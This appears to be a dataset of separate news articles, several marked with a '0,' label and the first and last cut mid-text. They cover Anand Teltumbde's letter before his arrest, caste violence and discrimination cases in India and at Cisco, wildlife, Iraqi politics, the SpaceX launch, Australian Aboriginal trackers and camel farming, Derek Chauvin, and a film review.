things that began happening to me. Although, I was aware that police used to visit the organisers of my lectures, mostly universities, and scare them with enquiries about me, I thought they might be mistaking me for my brother who left family years back. While I was teaching at IIT Kharagpur, an officer of BSNL phoned, introducing himself as my admirer and well-wisher, informed me that my phone was being tapped. I thanked him but did nothing, not even to change my SIM. I was disturbed by these intrusions but comforted myself that it might rather convince the police that I was a normal person and there is no element of illegality in my conduct. The police generally dislike civil rights activists because they question the police. I imagined, it might be due to the fact that I belonged to that tribe. But again I comforted myself that they would find that I could not perform that role either because of my full-time engagement with my job. But when I got an early morning phone call from the director of my institute, informing me that the police had raided the campus and were looking for me, I was wordless for a few seconds. I had come to Mumbai on official work just a few hours before and my wife had come earlier. When I learnt of the arrests, of the persons whose houses were raided that day, I was shaken by the realisation that I escaped that fate just by whiskers. The police did know my whereabouts and could arrest me even then but for the reasons known only to them, did not do so. They did open our house too, forcibly getting a duplicate key from the security guard, but just video-graphed it and locked it back. Our ordeal began right there. At the advice of our lawyers, my wife took the next available flight to Goa, and lodged a complaint with Bicholim Police Station that the police had opened our house in our absence and that we would not be responsible if they had planted anything. She volunteered giving our telephone numbers should the police want to inquire with us. Strangely,the police had started holding press conferences soon after they embarked on the Maoist story. It was clearly meant to whip up prejudice in public against me and other arrested with the help of obliging media. On August 31, 2018, in one such press conference, a police officer read out a letter purportedly recovered from the computer of previous arrestees as an evidence against me. The letter was clumsily constructed with the information on the academic conference I had attended which was easily available on the website of American University of Paris. Initially I laughed it out but next, decided to file a civil and criminal defamation suit against this officer and sent a letter on September 5, 2018 to the government of Maharashtra for sanction as per the procedure. There has been no response from the government to date. The press conferences of the police, however, were stopped when High Court reprimanded them. The Rashtriya Swayamsevak Sangh hand in the entire case was not hidden. My friends told me that one of their functionaries, Ramesh Patange, had written an article in their mouthpiece Panchjanya targeting me in April 2015. I was identified as “Mayavi Ambedkarwadi” along with Arundhati Roy and Gail Omvedt. Mayavi in the Hindu mythology refers to a demon meant to be destroyed. When I was illegally arrested by Pune Police while still under protection of the Supreme Court, a cyber-gang of Hindutva vandalised my Wikimedia page. This page is a public page and for years I was not even aware of it. They firstly deleted all information and only wrote, “He has a Maoist brother… his house was raided … he was arrested for links with Maoist”, etc. Some students later told me that whenever they tried restoring the page, or editing the page, this gang would pounce upon and delete everything and put up derogatory content. Ultimately, Wikimedia intervened and the page stabilised with some of their negative content. There was a media blitzkrieg, reeling off all kinds of canards through the RSS’s so-called Naxal experts. My complaints against the channels and even to the India Broadcasting Foundation did not receive a response. Then in October 2019, the Pegasus story came out that the government had inserted a very pernicious Israeli spyware on my phone, among those of several others. There was a momentary uproar in media but this serious matter also has died. I have been a simple person who has been earning his bread honestly and helping people to the extent possible with my knowledge through writings. I have an unblemished record of service for nearly five decades to this country in various roles in corporate world, as a teacher, as a civil rights activist and a public intellectual. In my voluminous writings comprising over 30 books, and numerous papers/articles/comments/columns/interviews, published internationally, not an insinuation of support to violence or any subversive movement could be found. But at the fag end of my life, I am being charged for the heinous crime under the draconian Unlawful Activities (Prevention) Act. An individual like me obviously cannot counter the spirited propaganda of the government and its subservient media. The details of the case are strewn across the internet and are enough for any person to see that it is a clumsy and criminal fabrication. A summary note on All India Forum for the Right to Education website may be read. For your benefit, I will provide its gist here: I am implicated on the basis of the five letters among the 13 that the police purportedly recovered from the computers of two arrestees in the case. Nothing has been recovered from me. The letter make reference to “Anand”, a common name in India, but the police unquestioningly identified it with me. Notwithstanding the form and content of these letters, which was trashed by experts and even by a justice in Supreme Court, who was the only one in the entire judiciary who went into the nature of the evidence. the content does not refer to anything that could be remotely construed as even a simple crime. But taking shelter under the draconian provisions of the UAPA Act, which renders a person defenceless, I am being jailed. The case may be depicted for your understanding as follows: suddenly, a police posse descends down on your residence and ransacks your house without showing any warrant. At the end, they arrest you and lodge in the police lockup. In the court, they would say that while investigating a theft (or any other complaint) case in xxx place (substitute any place in India) police recovered a pen drive or a computer from yyy (substitute any name) in which some letters written by a supposed member of some banned organisation were recovered that had a mention of zzz who according to the police is none other than you. They present you as part of deep conspiracy. Suddenly, you find your world turned topsy-turvy. Your job gone, family losing house, media defaming you about which you cannot do a damn thing. Police will produce “sealed envelopes” to convince judges that there was a prima facie case against you that needs custodial interrogation. No arguments about there being no evidence would be entertained as judges would answer that it would be seen in trial. After custodial interrogation, you will be sent to jail. You beg for bail and the courts will reject them as the historical data shows that the average period of incarceration ranged from four to 10 years before they got bail or acquitted. And this can happen literally to ANYONE. In the name of the “nation”, such draconian legislations that denude innocent people of their liberties and all constitutional rights are constitutionally validated. The jingoist nation and nationalism have got weaponised by the political class to destroy dissent and polarise people. The mass frenzy has accomplished complete derationalisation and inversion of meanings where destroyers of the nation become deshbhakts and selfless servers of people become deshdrohis. As I see my India being ruined, it is with a feeble hope that I write to you at such a grim moment. Well, I am off to National Investigative Agency custody and do not know when I shall be able to talk to you again. However, I earnestly hope that you will speak out before your turn comes.

The Dalit woman was abducted on Monday while she was travelling with her mother in a tempo. The incident took place at Raya Road which comes under the Sadabad police station in Hathras. The woman and her mother had come to Sadabad to buy medicines and were returning home in a tempo in the evening. During the journey, the woman felt sick and started vomiting. As a result, her mother stepped down from the tempo to fetch her some water. Taking the opportunity, the tempo driver and two other men decided to abduct the woman. They sped away in the vehicle with the woman, leaving the mother behind. The mother raised an alarm and informed her relatives, who rushed to the spot and called the police. Based on the complaint lodged by the woman's family, the police filed a case of abduction against the driver and two others. The police started its probe based on CCTV footage from a petrol pump in the region where the tempo was captured. The woman was later found based on the CCTV footage. The incident of abduction comes as a 19-year-old Dalit woman from Uttar Pradesh's Hathras died at Safdarjung hospital in Delhi on Tuesday morning, days after she was allegedly raped by four upper-caste men.

Pieter van Wyk filmed the lions as they spotted the large shadow cast by his jeep and made their way over to escape the glaring sun. Soon the 34-year-old found himself closely surrounded by the pride in the 15,000-hectare MalaMala Game Reserve in Mpumalanga. He was forced to sit it out and wait for the sun to move and the shadow to shrink, before the lions finally started to disappear and he could move on. The pride 22 lions surround the game rangers car as they seek to stay out the sun on a blazing day in South Africa The lions spot Pieter's car while roaming the 5,000-hectare MalaMala Game Reserve in Mpumalanga One female lion pants in the shade of Pieter's car first before the rest of the pride begin skulking over. She looks directly at the ranger as he says: 'They passed by our vehicles and this ended up being their chosen spot, as you can see.' The lions line up one-by-one in the shade behind his car with each sticking their heads up to look over at him while he films. He jokes that this is 'South African problems', although it is unclear whether he means the hot sun or the 22 predators keeping him in his car. The first female lion to lie down in the shade looks up while panting at Pieter as he films her The rest of pride sit behind her while she continues to curiously gaze at Pieter in his car Pieter said: 'It was late morning and the mercury levels were rising as the sun climbed higher into the sky. 'The lions, Africa's apex predators, were on the hunt not for food, but for shade. 'They decided that the shadow cast by my vehicle would do just fine. 'It is not uncommon during hot days on MalaMala Game Reserve and it was their decision to come into my 'personal space'. 'Animals have right of way so I had to wait. But it wasn't too long before the shadow got too small and they moved on.' Pieter can Wyk, 34, took the film as part of the Rangers in Isolation series to showcase MalaMala's wildlife to people stuck at home during the lockdown The moment was filmed as part of a series called Rangers in Isolation which sees rangers share videos of game drives and field work online during the lockdown. They hope people who wanted to visit MalaMala but were unable to due to the pandemic can still see the African bush and some incredible natural encounters. The reserve is home to the 'Big Five' animals - lions, leopards, elephants, rhinoceroses and Cape buffalo - as well as cheetahs, hyenas, giraffes, hippos and wild dogs. It also housed Tjololo, a famous leopard who starred in the National Geographic documentary Stalking Leopards, until he died in October, 2007.

0," The CA Department of Fair Employment and Housing also names two former Indian American Cisco managers as defendants. Follow @ambazaarmag The California Department of Fair Employment and Housing sued Cisco Systems Inc on Tuesday after an Indian American employee accused the tech giant of discrimination, claiming he was harassed by two managers for being from a lower Indian caste than them, according to a report. While the lawsuit, which was filed in a federal court in San Jose, does not name the alleged victim, the two former Cisco engineering managers, Sundar Iyer and Ramana Kompella, are labeled as defendants, the Reuters reported. The managers accused of harassment for internally enforcing the Indian caste hierarchy are Brahmins. The alleged victim is a Dalit. According to the lawsuit, the two supervisors knew of the engineer’s lower caste. While US employment regulations do not explicitly prohibit caste-based discrimination, the California Department of Fair Employment and Housing claimed in the lawsuit that “[the company] engaged in unlawful employment practices on the basis of religion, ancestry, national origin/ethnicity and race/color.” The unnamed employee reported Iyer to human resources in November 2016 for outing him as a Dalit to the rest of his colleagues, as well as telling them the only reason he [the alleged victim] was able to enroll at the Indian Institute of Technology was through affirmative action. The lawsuit says the employee received less pay and fewer opportunities after he opposed “unlawful practices, contrary to the traditional order between the Dalit and higher castes, Defendants retaliated against him.” “Cisco is committed to an inclusive workplace for all,” company spokesperson Robyn Blum was quoted by Reuters as saying. “We have robust processes to report and investigate concerns raised by employees which were followed in this case dating back to 2016, and have determined we were fully in compliance with all laws as well as our own policies,” Blum said. this is absolute nonsense…i’m reading about this caste system and i felt like it was a child who made this game up and the people were so stupid they fell for it…oh, we are going to be this and you are going to be that and if you are really good at cleaning toilets and bowing to me when i walk down the street then in your next life you will move up and get closer to me…really? really ? who makes this sh** up? Both brahmins had their masters in Stanford. Even the Stanford education failed to remove their casteist mindset Your email address will not be published.

0,"A bill to study if an Emancipation trail in Southeast Texas should receive a national designation is now headed to President Trump’s desk for his signature.  The 51-mile trail would show the migration route used by newly freed slaves and other people of African descent in the 19th century. It’s based on the research of Naomi Mitchell Carrier, the founder of the Texas Center for African American Living History in Houston. “I was able to outline some 40 or more sites that have historical markers between Reedy Chapel in Galveston and Freedmen’s Town in Houston,” said Mitchell Carrier. “That is the trail.” The route would include Independence Heights, Freedmen’s Town and Emancipation Park in Houston. It would also include the site of Galveston’s Osterman building, where a Union Army General told the people of Galveston that all slaves were free. “When Major General [Gordon] Granger arrived in Galveston with news that all slaves were free, he changed countless lives as well as the course of history,” Sen. John Cornyn said in a statement. “By commemorating the trek so many families took to spread the great news, we can honor those families and celebrate the freedom we cherish as Texans and Americans.” The Texas Republican and Congresswoman Sheila Jackson Lee, D-Houston, sponsored the legislation calling for the study of the trail. It passed the U.S. Senate Monday, and was previously approved by the House in May. “The historic passage of the Emancipation National Historic Trail Study Act by the Senate will result in only the second trail in the United States that chronicles the experience of African Americans,” Jackson Lee said in a press release. According to Jackson Lee, there’s only one other trail of its kind that focuses on African Americans and their experiences: the Selma to Montgomery National Historic Trail. That heritage tourism attraction generates millions of dollars, which Jackson Lee said could also happen in Texas. “In addition to preserving this important heritage, the Emancipation National Historic Trail is estimated to generate millions of dollars and hundreds, if not thousands, of jobs for the Texas region’s economy,” she said. Overall, Mitchell Carrier said creating the trail is a must for Texas and its African American history. “And, this history has either been wiped from memory or prohibited from memory,” she said. “The National Historical Emancipation Trail is about a restoration, resurrection, and ascension of historical memory.”  "
0,"https://arab.news/8rx5d BAGHDAD: Iraq’s president named little-known former regional governor Adnan Al-Zurfi as prime minister-designate on Tuesday in another attempt to overcome months of unrest and deadlock. Zurfi now has 30 days to form a government that must then survive a vote of confidence in Iraq’s deeply divided parliament. He is the second man chosen to succeed Adel Abdul Mahdi, who resigned in November amid mass anti-government protests. The next candidate, Mohammed Allawi, quit on March 1, accusing parties of obstructing him. President Barham Salih named Zurfi only after larger rival Shiite political parties failed to agree on a candidate. Those same groups rounded on the new candidate, who is head of the small Nasr parliamentary group of former Prime Minister Haider Al-Abadi. “We hold the president fully responsible for the repercussions of these provocative steps,” said the Fatih alliance, which represents mostly Iran-backed Shiite militia leaders in parliament. “He’s an American joker and we reject him,” said Hassan Salim, a member of parliament from Asaib Ahl Al-Haq, an Iranian-backed group that is designated as a terrorist organization. Zurfi lived in the US as a refugee in the 1990s after fleeing the Saddam Hussein regime, and is seen as a comparatively secular figure. After Saddam’s overthrow, he was governor of Najaf. Hours before his nomination, two rockets fell inside Basmaya military camp to the south of Baghdad, which houses US-led coalition troops, without causing any damage."
0,"Posted on April 28, 2020  Tracking symptoms of Coronavirus and understanding its vast impact have been made easier for Iraqis thanks to a new local platform supported by UNDP Iraq’s Accelerator Lab. The Corona in Iraq platform was originally developed by local web developer Mustafa Alwan, a member of CS50x-Iraq Developers Union which contains a pool of computer science and programming experts from Harvard University’s CS50 developers’ training program. Alwan designed the platform to support his country’s mission to tackle the spread of COVID19. When UNDP Iraq’s Accelerator Lab team – whose role it is to identify and upscale locally-designed solutions that attempt to solve a country’s most pressing challenges – discovered Corona in Iraq, the potential to develop it was tangible, present, and exciting. Iraq is one of 60 teams across UNDP’s global network of labs sourcing local solutions to respond to global challenges. “Absolutely take it to the next level!” was the initial reaction of UNDP Iraq’s Resident Representative, Zena Ali-Ahmad when the Accelerator Lab team pitched the idea. “In Iraq, misinformation about the virus is a huge challenge, and rumors are circulating within the community. Corona in Iraq is an innovative way to quell some of these rumors and provide people with real facts and necessary courses of actions if they feel they may have the virus,” she said. Stigma associated with COVID-19 is also prevalent in Iraq, with many people refraining from seeking medical advice due to a fear that, if tested positive or if perceived to have the virus, they would be shunned and discriminated against by their communities. “Through a portal that tracks symptoms, users are encouraged to speak up and consult medical professionals if they contain symptoms. This simple action is extremely important as we support the Government of Iraq in their efforts to limit the spread of the virus across the country,” adds Ms. Ali-Ahmad. Key features of Corona in Iraq: Raises awareness about the symptoms and risks of COVID-19 and dispels rumors about the virus. Corona in Iraq draws from the most up-to-date information and data from the World Health Organization (WHO). It contains localized information including statistics on the number of reported cases and fatalities in Iraq. It also provides information on how to stay hygienic and healthy in everyday life. A partnership with UNICEF will soon allow information specific to Iraqi youth, with an opportunity for young people to submit questions about the virus. This critical feature comes at a time when many young people are feeling anxious due to the strict curfews imposed across the country, limiting their schooling and social life. Tracks symptoms to encourage people to seek medical advice Stigma can be heightened by insufficient knowledge about how COVID-19 is transmitted and treated, and how to prevent infection. By using Corona in Iraq, users are able to track their symptoms through a multiple-choice questionnaire containing 10 simple questions. This feature fosters a testing culture, encouraging users to speak to a health professional if they are experiencing symptoms, which ultimately helps to prevent stigma associated with the virus. Geographical scanning of COVID-19 hotspots Also included on the platform is a geographical scanning feature which maps out the geographical spread of the virus across the entire country and the most affected areas that require increased support, such as sterilization and fumigation.

I did😂😂” The launch of the Crew Dragon will be the first manned-mission in almost 10 years from the USA; as well as the first time a privately-owned and operated spacecraft will be used. NASA said: “We will return human spaceflight to American soil after nearly a decade. Tomorrow is not only a big day for our teams – it’s a big day for our country.” Buzz Aldrin, the second man to walk on the moon, tweeted how much he was looking forward to today’s “historic mission – it’ll be a day all Americans and space fans everywhere will never forget!” South Africans too. Space-X founder Musk is a former Pretoria High pupil who has been one of the country’s most successful expats, founding game-changing companies like Space-X and electric motor car company Tesla. Musk told CBS: “This is the culmination of a dream.” With his entrepreneurial skills, and passion for space travel, Musk has led Space-X to pioneer the first re-usable rockets, with the Falcoln 9 able to land back on Earth safely… thus reducing costs drastically. The two astronauts who will bravely venture forth this evening are best friends Bob Behnken and Doug Hurley. Both have visited the International Space Station twice before, before NASA’s launches stopped in 2011. The astronauts were given the chance to pull out, but both are adamant they’d like to go ahead. The only thing that may prevent the mission is the weather. CBS says there’s a “60% chance the weather on the launch pad will cooperate for a moment in space history”, and conditions are improving. It’s important that the seas remain calm so that “in a launch crisis, the SpaceX capsule would ditch to safety in the Atlantic Ocean”. Watch the Space-X / NASA launch LIVE here (10.30pm South African time). The live stream has already begun. American singer Kelly Clarkson will be performing the US national anthem. ""This is the culmination of a dream,"" @SpaceX founder @elonmusk tells CBS News' Mark Strassmann ahead of Wednesday's planned launch of the Crew Dragon; it would be the first using a privately owned and operated spacecraft. https://t.co/uFs6yomfsD pic.twitter.com/UYCceKQ596 — CBS Evening News (@CBSEveningNews) May 26, 2020  Musk was born and raised in South Africa, but like some other young South Africans in the ’80s, he dreamed of moving to America, a place that represented “freedom” for him (he told Vogue magazine in 2015). At the age of 17 he moved to Canada and lived with various relatives of his Canadian-born mom’s before moving to the USA. And the rest is history.

0,"In a shocking incident, a Dalit farmer was beheaded in Uttar Pradesh because he refused to share water for irrigation with another farmer. The police have arrested the accused. The incident took place in Badaun's Din Nagar Sheikhpur village where Nathu Lal Jatav was watering his field late Monday. Another farmer, Roop Kishore, asked Jatav to divert water to his field but Jatav refused, saying that his field needed more water. Jatav was then beaten up and beheaded by the angry farmer. Some locals tried to intervene, but fled when Roop Kishore attacked Jatav with a spade. The 56-year-old farmer is reported to have slumped to his death. Jatav's son, Ompal, told reporters that he and his father had been working in the field till late in the night. ""My father told me to go home and keep dinner for him. When he did not return home till the early hours of the morning, I went to the field. On the way, one of the locals told me that Roop Kishore had killed my father. I reached the spot and saw my father's beheaded body lying there,"" Ompal said. Ompal further said that Roop Kishore alone could not have committed the crime and there were a few others with him. Superintendent of Police (SP) Siddharth Verma said that an FIR has been lodged against Roop Kishore on the basis of Ompal's complaint. ""Roop Kishore has been booked for murder and under sections of the Scheduled Castes and Tribes (Prevention of Atrocities) Act at the Bilsi police station. He was absconding, but we have tracked him down and arrested him. Further investigations are underway to find out if more people were involved,"" the SP said.

0," Aboriginal elders taught Warwick Hill to catch camels in Central Australia, and changed his life Aboriginal and Torres Strait Islander readers are advised that the following article contains images and voices of people who have died. During his first six months of rounding up camels, Warwick Hill got absolutely pummelled. He is now a confident camel dairy farmer on South Australia's Limestone Coast, but 30 years ago camels were a foreign concept to him when he first started mustering the wild animals. ""We just wasted our time and got injured and thrown off camels and lost them and caught them again,"" Mr Hill said. The adventure started in the 1980s, when a 19-year-old Mr Hill travelled to the Anangu Pitjantjatjara Yunkunytjatjara Lands (APY) in the remote north-west of SA to hunt rabbits, only to find they had been decimated by the calicivirus. Without any rabbits around, his best friend and elder, Roger Kayipipi, asked if he wanted to try catching camels. On their first go they rounded-up a couple of big bulls using lassos and a four-wheel drive. ""That was the stupidest kind of thing to bring back and try and break-in,"" Mr Hill said. It was not until an expert camel handler came out to do some mustering in the lands that Mr Hill and Mr Kayipipi worked out how to break-in the wild animals using traditional tracking techniques. ""If you can stay on the track, you can find the camel,"" Mr Hill said. ""I learnt eventually to do it — nowhere near as good as what they can."" They learnt how to keep the camels as calm as possible by keeping the four-wheel drives and motorbikes at a distance. ""We'd have to bring them in as quickly as we could without riding them hard because they overheat and then react … you can't get them into the yards,"" Mr Hill said. Thirty years later, Mr Hill has been running a camel dairy 2,173 kilometres from where he learnt to catch them. He is now preparing to return to the APY Lands to muster a further 1,000 camels for an emerging camel dairy in Victoria, but it will not be an easy task. ""To find a good milking camel you're only looking at a very small percentage,"" Mr Hill said. ""Between three to five per cent of all the camels that you can catch will actually be worthwhile."" Mr Hill spent 11 years living and learning from Aboriginal elders in the heart of Australia. A rabbit shooter from Western Australia, he was sent to the APY Lands by his boss, a rabbit buyer and railway ganger in Kulgera, Northern Territory. Mr Hill went without knowing he was entering Aboriginal territory and said permits ""weren't really required back then"". He went on to live in the community and sell rabbits directly to the locals. It was around then that he made the decision to learn the Pitjantjatjara and Yankunytjatjara languages. ""I was out there on my own, so I felt like I wanted to participate with the community at large,"" Mr Hill said. Bringing rabbits to the communities as a primary hunter gained him respect. ""That really got me in good stead and trusted, and just learning lots of firsthand stories and experiences, which I just loved, it was great,"" Mr Hill said. The elder who adopted him, Mr Kayipipi, passed away a few years ago. ""Nearly all of the elders that I was very good friends with all those years ago have now passed away, which is very unfortunate."" After leaving Central Australia Mr Hill went travelling. He was salvaging a sunken pirate ship in Timor-Leste when he met his wife, TJ, a filmmaker. ""We just hit it off. We sailed around for the next eight years,"" he said. They travelled the world working on expensive yachts to fund their wanderlust. In 2014 the pair were back in SA for what was meant to be a short stint. ""I took TJ back out to the APY Lands to meet up with the elders and we just got wrangled into camel mustering again,"" Mr Hill said. Camel milk was gaining momentum in Australia and they decided to take the plunge and start a business. In 2015 they started Humpalicious with 70 camels at SA's Port Germein on the Spender Gulf. But after three years getting the business up and running their landlord upped the rent and operations were no longer viable. With a bit of help from Mr Hill's father they bought 40 hectares at Robe, on SA's Limestone Coast. They have had one summer in their new home with their 50 camels, all individually named. ""It's been tough, it's been slow, but it's now getting there,"" Ms Hill said. ""It's a brand new industry so we've had to build not only the profile for the milk but also our brand name, our business… all of it, it didn't exist before."" With minimal lactose and a similar level of protein to cow milk, Mr Hill does not understand why the camel product is not as accepted but he is undaunted. ""Starting a new industry where it hasn't been proven, it's not all laid out… that's not for everybody,"" Mr Hill said. ""I like that challenge."" From the camels that are born at the farm only a quarter of them will likely produce milk. ""They're either a good milker or they're not,"" Mr Hill said. Back in the APY Lands, the young men Mr Hill taught to muster camels are continuing the practice. ""Those guys are now continuing to manage, and muster, and handle the camel business out in Central Australia, which is fantastic,"" he said. Despite travelling all over the world several times, Mr Hill's love for Australia's open land and the camels that roam it ring the loudest. ""I think if I'd been born 200 years ago I would have been out in the middle of Australia, probably on the back of a camel getting lost somewhere.""

0,"Former Minneapolis police officer Derek Chauvin, who has been charged with third-degree murder in the death of George Floyd, also worked security at a local nightclub and was quick to use aggressive tactics including mace when working on African American nights, according to the establishment’s owner. Maya Santamaria, former owner of El Nuevo Rodeo club in Minneapolis, Minn., told the Twin Cities Pioneer Press that Floyd and Chauvin both worked at the club together but she is unclear if the two men knew each other. She also noted that “when the club hosted events that drew a mainly black clientele,” Chauvin responded to fights by taking out his mace and spraying the crowd, a tactic she told him was unjustified ‘overkill.’” “He would mace everyone instead of apprehending the people who were fighting,” Santamaria told the Pioneer Press. “He would call backup. The next thing you would know, there would be five or six squad cars.” On May 25, Floyd was stopped, forced to the ground and placed in handcuffs by Chauvin, who was subsequently was recorded on video kneeling on Floyd’s neck for more than eight minutes. Floyd can be heard yelling “I can’t breathe” several times on the video. Floyd was eventually rendered unconscious and was later pronounced dead at a local hospital. Officials fired Officer Chauvin from the police force Tuesday, along with three other officers who were also present during the arrest and did nothing to stop the excessive use of force. Chauvin was arrested Friday and charged with third-degree murder and manslaughter. Like many police officers, Chauvin had an off-duty job working security and maintained his off-duty brutality hustle for 17 years until his arrest. The Pioneer Press notes that Floyd “started working there recently as a bouncer but only worked about a dozen events put on by ‘African American promoters.’” Get 26% off and Spend 100% Less Time Cleaning Equipped with its own self-empty station, this vacuum connects to Alexa devices and allows you to create maps of your rooms, so you can be completely hands-off. Santamaria, who recently sold the venue, said that if Chauvin had recognized Floyd, “he might have given him a little more mercy.” She did add that Chauvin appeared to work well during Latino events but would be overly aggressive during “African American” nights. “I told him I thought this is unnecessary to be pepper-sprayed. The knee-jerk reaction of being afraid, it seemed like overkill,” Santamaria said. “It was a concern and I did voice my opinion, but police officers have a way of justifying what they do.” She added that she was shocked to see the video of Chauvin with his knee pressed against Floyd’s neck. “I thought he would have more of a conscience,” she told the Pioneer Press. “Even if he is a bit of racist, he’s a human being… At what point does your humanity overpower your racial bias?” Apparently, never, Ms. Santamaria. Almost never."
0,"Serious Men’s narrow understanding of the Dalit reality is rivalled by its problematic gender politics. 2.5/5 cast director Language: Hindi (with some Tamil) Ayyan Mani is an assistant to Arvind Acharya, the arrogant director of a government-run scientific research institute in Mumbai. Mani is a Tamilian who moved to Mumbai as a child, which is the explanation he offers for his bad Tamil. The difference in social standing between the protagonist and his boss is not a factor of class alone – Mani (played by Nawazuddin Siddiqui) is Dalit, and Acharya (M Nasser), a fellow Tamilian, is Brahmin. “Moron, imbecile, knobhead” – these are the epithets hurled by those in power at Mani and his ilk, irrespective of how much they try to please. As revenge, the “morons” have come up with the term “serious men” for educated people privileged enough to conduct studies on “chutiastic” subjects. Awareness of the oppression that his family has suffered for generations, resentment towards Acharya and a determination to escape his present life in a cramped one-room tenement with his wife Oja and son Adi are all the motivation Mani needs to act in ways that are no less dishonest than the rackets run by these ‘serious men’. Directed by Sudhir Mishra (Is Raat Ki Subah Nahin, Hazaaron Khwaishein Aisi), Serious Men parallels the games played by individuals from all the strata of society covered in the plot. Adi has a reputation as a child genius, which makes him a magnet for opportunistic politicians and school administrators. Soon he becomes nationally famous. Meanwhile, the media spotlight trained on Dr Acharya’s pet project has consequences for everyone concerned. The film’s screenplay by Bhavesh Mandalia and Abhijeet Khuman (additional screenplay credit: Niren Bhatt and Nikhil Nair), is drawn from the novel of the same name by Manu Joseph. At first it is sharp, funny and deliciously irreverent. Mani minces no words about his antagonism towards the haves around him, and the writers make no apologies for his attitude. He is who he is. Gradually though, despite the humour in the situations portrayed, especially in the satirical take on corruption that knows no social barriers, and despite the entertaining audacity of Mani’s strategies, the film reveals its hollow core. Serious Men uses the word “Dalit” as a mere hook, but makes little distinction between class and caste, thus revealing its poor knowledge of the immutable nature of caste – the whole point of the caste system is that even a Dalit who rises to a position of power and wealth is still deemed contemptible, whereas the social class an individual occupies can and does change depending on their financial status and consequent connections. In its gripping opening minutes, Serious Men makes all the right noises to establish that it intends to delve into the Dalit experience: Mani tells a story about his grandfather and on the notice board of his institute are the words, “Reservations cannot be the only compensation for treating fellow human beings like animals for the last 3,000 years.” That sentence in particular holds out the promise of empathy and a deep examination of caste practices within elite professional circles. Once Mani’s caste identity is underlined though, nothing bad happens to him and his family that would not happen to any poor Indian irrespective of caste. This is in keeping with the view often expressed by the upper-caste urban elite – including those who claim to be liberal – that caste no longer exists “at least among people like us”, and that caste and class are synonymous. A still from Serious Men. YouTube Serious Men’s narrow understanding of the Dalit reality is rivalled by its problematic gender politics. Three women get reasonably significant screen time in the film: Mani’s wife Oja (Indira Tiwari) serves the purpose of being a recipient of his pearls of wisdom, Acharya’s colleague Oparna Sengupta (Vidhi Chitalia) is condescendingly written as nothing more than an attractive young woman having an affair with her older male boss, and the politician Anuja (Shweta Basu Prasad) refuses to allow her team to play up her experience of domestic violence in public saying, “…next time no ‘Dalit woman victim card’ shit for me, please” – words that would be music to the ears of those who, in the off-screen world, dub any exposé of genuine oppression as “the woman card"", “Dalit card” or “playing victim”. As if to warm the hearts of right-wingers, Serious Men even slips in a scene of a nun in a Mumbai school trying to convert a Dalit to Christianity with the lure of special schemes for the underprivileged. This episode furthers the long-running propaganda that schools run by India’s Christian minority are hotbeds of conversion (propaganda that fails to explain how then the percentage of Christians in India’s population remains stagnant and minuscule). Serious Men’s superficial interpretation of caste, its male gaze and its pointed jab at a religious minority that is viewed with dislike by the current establishment are all disguised as satire that is carefully wrapped in a package of pacey writing, playful music by Karol Antonin and superb acting by Nawazuddin Siddiqui. The women actors are under-utilised but excellent to the extent that they have space to be so. Nasser is rarely well-used by Hindi films – here for a change he gets a solid role and in response he makes Acharya a nicely evil, non-clichéd jerk. When Siddiqui is in full form, there are not many in Bollywood who can match up to him, but Aakshath Das playing Adi is more than up to the task. Siddiqui is a treat to watch in Serious Men although he does not look Tamilian from any angle (unlike Tiwari who fits the bill on that front). If you are willing to buy into that deceit then you might, like me, enjoy the thoughtful shades he lends to both the quirky and thoughtful aspects of Mani’s character or have a lark listening to the peculiar tone in which he tells a hotel employee that he wants his beer “not extremely chilled, not warm”. This is not to suggest at all that the only issue with Serious Men is its problematic politics. Plotwise, the film rests on a foundation of extreme improbability. Mani manages to dupe experts and ordinary people with a particular scam that remains undiscovered for several years, although the very cornerstone of that con is shaky – with just a moment’s thought, it becomes glaringly evident that he could have been easily found out much earlier if even one person had asked an actually tough question or probed further when fobbed off with evasive answers. Conveniently for the film, no one does. Serious Men will stream on Netflix from 2 October.

0," Barry Port, the last Aboriginal police tracker employed solely for the role, dies Australia's last Aboriginal police tracker employed solely for the role has died. Barry Port was a legend in Far North Queensland, particularly at Coen in Cape York, where the town's public bar is named in his honour. Mr Port, who would comb the Cape's harsh terrain for criminal, traffic and missing persons cases, hung up his hat several years ago to enjoy fishing on the Coen River. Aged in his 70s, he died at home on Wednesday night from a heart condition. ""Dignified, humble, caring — such a rare kind of gentleman,"" Dianne MacDonald wrote on social media. ""The world has lost a beautiful soul."" Duane Port said his grandfather would be ""deeply missed"" and that his death had come as a shock. The quietly-spoken Lama Lama elder learnt traditional bush skills from his father, who learnt from his father before him. They did not own a car so they would hunt on foot and look for fresh tracks from pigs. Mr Port's tracking ability and bush skills caught the attention of police in 1980. He was signed up and would spend more than 30 years pursuing drug dealers, escaped prisoners and cattle rustlers. ""We'd go out looking for drugs, people camping in the bush who had set up big plantations, and once we found it we'd destroy it all,"" Mr Port told the ABC in 2018. ""You could follow their footsteps through the scrub, they'd make a bit of a track to their crop. ""It was a pretty dangerous job — the dealers, they've got guns and knives and you'd have to be very careful."" Mr Port's funeral will be held later this month.

0,"New Delhi, Aug 23: A Sikh man based in the US has alleged that the chief of the Pakistan-sponsored Khalistani extremist group Sikhs For Justice (SFJ), Gurpatwant Singh Pannun extorted $15,000 from a Dalit youth from Punjab. The US-based SFJ has been running a secessionist campaign seeking to “liberate” Indian Punjab from “occupation”. The group is headed by Pannun, a law graduate from Punjab University and an attorney at law in the US. The Indian government banned the group last year. In a video shared on social media, Surjit Singh of California has alleged that Pannun cheated him of $15,000 which he had paid to him in an immigration case of a Dalit youth last year. Surjit Singh is heard saying in the video that he gave Pannun $15,000 for getting the US residency status for a Punjabi youth of the Valmiki community (Dalit). However, after Pannun received the money, he did not fulfill his commitment and did not deliver what he had promised. Surjit is also heard saying in the video that whatever Pannun has been doing, he does it only for money. The video is a recorded phone call between Surjit and a representative of a media channel. Surjit asked the media channel if they were doing a programme on Pannun. The mediaperson informed Surjit that they indeed have aired a show on Pannun and were following up with another programme on Pannun’s men. Surjit during the conversation said, “Gurpatwant Singh Pannun is a fraudster. Last year, a boy (from Valmiki community) from our village came to Georgia in the US with the help of an agent and was imprisoned. Someone told me to contact Pannun, claiming that he had a good hold in immigration. So we contacted Pannun’s law firm. Pannun demanded $7,500 in advance for the release of the youth. However, Pannun did not attend the court hearing in Georgia.” Narrating his ordeal, Surjit said he called Pannun again but he demanded another $7,500 for the case. “We don’t know when the case started and when it ended. Pannun took $15,000 from us but the case was not resolved. Pannun is collecting money by fooling people and later he does not even receive their phone calls,” Surjit said. The Dalit youth was sent back to Punjab in December last year. Describing Pannun as a “very deceitful man” Surjit said that he never turned 